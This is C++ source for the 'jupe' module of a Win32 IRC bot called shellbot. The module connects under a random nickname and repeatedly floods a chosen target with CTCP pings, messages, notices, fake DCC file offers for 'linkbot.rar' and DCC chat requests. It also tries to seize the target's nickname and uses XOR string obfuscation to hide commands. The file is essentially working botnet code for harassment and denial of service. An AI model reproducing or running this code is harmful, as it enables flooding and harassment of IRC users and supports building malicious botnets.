/*	shellbot - a high performance IRC bot for Win32
	Copyright (C) 2005 Shellz

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "vPOEb.h"
#include "vInclude.h"

bool CJupe::bRunning = true;
bool CJupe::bReply, CJupe::bInitiated,
CJupe::bCheck1, CJupe::bCheck2;
int CJupe::iDelay;
CPOEb CPOEb::s;

//! Spam that muthafucker?
void CJupe::WhoisThread(LPVOID lpClient) {
	JInfo *jClient = (JInfo*)lpClient;
	bInitiated = false; iDelay = 1000;
	while(bRunning) {
		bReply = false;	bCheck1 = false; bCheck2 = false;	
		if (bInitiated) {			
#ifdef DEBUG_MODE
		vPOEb->s.DebugPrint("jupe",con::fg_blue,"Sending messages...");	
#endif // DEBUGMODE
			
			//! Ctcp Ping
			Send(jClient->Socket, "PRIVMSG %s :\1PING %d\1\r\n", jClient->s_NickToJupe.c_str(), GetTickCount()); Sleep(500);
			//! Message
			Send(jClient->Socket, "PRIVMSG %s :%s\r\n", jClient->s_NickToJupe.c_str(), SENDMSG); Sleep(500);
			//! Notice
			Send(jClient->Socket, "NOTICE %s : %s\r\n", jClient->s_NickToJupe.c_str(), SENDMSG); Sleep(500);
			//! DCC Send
			Send(jClient->Socket, "NOTICE %s :DCC Send linkbot.rar <1.3.3.7>\r\n", jClient->s_NickToJupe.c_str()); Sleep(100);
			Send(jClient->Socket, "PRIVMSG %s :\1DCC SEND linkbot.rar 1096751950 1024 1843\1\r\n", jClient->s_NickToJupe.c_str()); Sleep(500);
			//! DCC Chat
			Send(jClient->Socket, "NOTICE %s :DCC Chat <1.3.3.7>\r\n", jClient->s_NickToJupe.c_str()); Sleep(100);
			Send(jClient->Socket, "PRIVMSG %s :\1DCC CHAT chat 1096751950 1024\1\r\n", jClient->s_NickToJupe.c_str()); Sleep(500);
			//! Nick
			Send(jClient->Socket, "NICK %s\r\n", jClient->s_NickToJupe.c_str()); Sleep(100);

			//! Sleep my dear
			Sleep(WHOIS_DELAY*iDelay);

		}
	}
	ExitThread(0);
}
		
void CJupe::RunningThread(LPVOID lpClient) {
	Sleep(1000); bool m_Disconnect = false;
	JInfo *jClient = (JInfo*)lpClient;
#ifdef DEBUG_MODE
		vPOEb->s.DebugPrint("jupe",con::fg_blue,"Server: %s:%i", jClient->s_Server.c_str(), jClient->iPort);	
#endif // DEBUGMODE
	try {
		CreateThread(NULL, 0, (unsigned long (__stdcall *)(void *))&WhoisThread, lpClient, NULL, 0);
		while(bRunning) {	Sleep(2000);
			if (!Connect(jClient)) continue;
#ifdef DEBUG_MODE
			vPOEb->s.DebugPrint("jupe",con::fg_blue,"Connected to JUPE server...");	
#endif // DEBUGMODE
			string sRandNick = RndNick("");			
			Send(jClient->Socket, "NICK %s\r\nUSER %s 0 0 :%s\r\n",sRandNick.c_str(),sRandNick.c_str(),sRandNick.c_str());		
			while(1) { 
				if (!bRunning) break;
				const int vBufSize = 2;
				CCmd cCmd; FD_SET Reader; int readsocks;
				char vBuffer[vBufSize]; memset(vBuffer,0,vBufSize);
				string vBuf; string contents;
				char szEndOfBuff[1];
				string vBuffer2;
				while(1) {		
					int c = recv(jClient->Socket, vBuffer, vBufSize-1, 0);
					if (c == SOCKET_ERROR || !c) {
						m_Disconnect = true;
						break;
					}						
					sprintf(szEndOfBuff, "%c", vBuffer[0]);
					vBuffer2 += vBuffer;
					if (szEndOfBuff[0] == '\n') {
						break;
					}
				}	
				if (m_Disconnect) { m_Disconnect = false; break; }
				contents = vBuffer2; vector <string> eBuffer;
				eBuffer = ParseIRCBuffer(contents, "\r\n");
				for (int k=0;k<eBuffer.size();k++) {
					vector <string> iBuffer; 
					iBuffer = ParseIRCBuffer(eBuffer[k], " ");				
					if (iBuffer.size()>1) {							if (iBuffer.size()>1) {
						bReply = true;
					/*	if (iBuffer.size()>3 && iBuffer[2] != "test") {
							int iNamePos = 0; iDelay = 1000;
							for(int i=3; i<iBuffer.size(); i++) {
								if (iBuffer[i] == "test") {
#ifdef DEBUG_MODE
		vPOEb->s.DebugPrint("jupe",con::fg_blue,"Found you in string...");	
#endif // DEBUGMODE
									iNamePos = i; break; }
							}
							if (iNamePos == 3) bCheck1 = true;
							else if (iNamePos == 7) bCheck2 = true;
						}*/
						if (iBuffer[1].compare("001") == 0 || iBuffer[1].compare("005") == 0) {
							bInitiated = true;
							Send(jClient->Socket,"%s %s +i\r\n",/*MODE*/XorStr<0x31,5,0x75083E64>("\x7C\x7D\x77\x71"+0x75083E64).s,vPOEb->vIRC.cConf.vRealNick.c_str());
						} 
						else if (iBuffer[0].compare(/*PING*/XorStr<0x8B,5,0x1D96D070>("\xDB\xC5\xC3\xC9"+0x1D96D070).s) == 0) {
							iBuffer[0].replace(1,1,"O");
							Send(jClient->Socket,"%s %s\r\n",iBuffer[0].c_str(),iBuffer[1].c_str());
						}
#ifdef DEBUG_MODE
			vPOEb->s.DebugPrint("jupe",con::fg_blue,"%s",eBuffer[k].c_str());	
#endif // DEBUGMODE
					}	
					}
				}
			}
		}
		
	} catch (...) {
#ifdef DEBUG_MODE
			vPOEb->s.DebugPrint("jupe",con::fg_blue,"Caught exception");	
#endif // DEBUGMODE
		ExitThread(0);
	}
	closesocket(jClient->Socket);
}

vector <string> CJupe::ParseIRCBuffer(string vBuffer, string type) {
	vector <string> contents;
	int currentpos = -1;
	int prevpos = 0;
	int counter = 0;
	while (1) {
		currentpos = vBuffer.find(type, prevpos);
		if (currentpos == -1) break;
		contents.push_back(vBuffer.substr(prevpos, currentpos-prevpos));
		prevpos = currentpos+type.length();
	}
	contents.push_back(vBuffer.substr(prevpos, vBuffer.length()-prevpos-type.length()+1));
	return contents; 
}

string CJupe::RndNick(string vPrefix)
{
	string vRet;
	srand(GetTickCount());
	for(int i=0; i<6; i++) 
		vRet += char((rand()%26)+97);
	return vPrefix+vRet;
}

void CJupe::Send(SOCKET Socket, const char *vBuffer, ...) {
	va_list va_alist; char formatbuf[8192]; va_start(va_alist, vBuffer);
	_vsnprintf(formatbuf, sizeof(formatbuf), vBuffer, va_alist); va_end(va_alist);

	if (send(Socket,formatbuf,strlen(formatbuf),0) == SOCKET_ERROR) {
		closesocket(Socket);
#ifdef DEBUG_MODE
		vPOEb->s.DebugPrint("jupe",con::fg_blue,"unable to send buffer");	
#endif // DEBUGMODE
		bInitiated = false;
	}	
}

bool CJupe::Connect(JInfo *jClient) {
	SOCKADDR_IN vSin;
	vSin.sin_family = AF_INET;
	vSin.sin_port = htons(jClient->iPort);
	vSin.sin_addr.s_addr = ResolveAddress(jClient->s_Server);
#ifdef DEBUG_MODE
		vPOEb->s.DebugPrint("jupe",con::fg_blue,"Resolved address...");	
#endif // DEBUGMODE

	jClient->Socket = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if (jClient->Socket == SOCKET_ERROR) {
#ifdef DEBUG_MODE
		vPOEb->s.DebugPrint("jupe",con::fg_blue,"create socket error");
#endif
		closesocket(jClient->Socket);
		return false;
	}
	Sleep(100);
#ifdef DEBUG_MODE
	vPOEb->s.DebugPrint("jupe",con::fg_blue,"attempting to connect to server");
#endif
	if (connect(jClient->Socket,(LPSOCKADDR)&vSin,sizeof(vSin)) == SOCKET_ERROR) {
		closesocket(jClient->Socket);
#ifdef DEBUG_MODE
		vPOEb->s.DebugPrint("jupe",con::fg_blue,"connect socket error");
#endif
		return false;
	}
	return true;
}

unsigned long CJupe::ResolveAddress(string server)
{
	
	unsigned long IP = inet_addr(server.c_str());
	if (IP==INADDR_NONE) {
		hostent *pHE = gethostbyname(server.c_str());
		if (pHE == 0) 
			return INADDR_NONE;
		IP = *((unsigned long *)pHE->h_addr_list[0]);		
	}

	return IP;
}
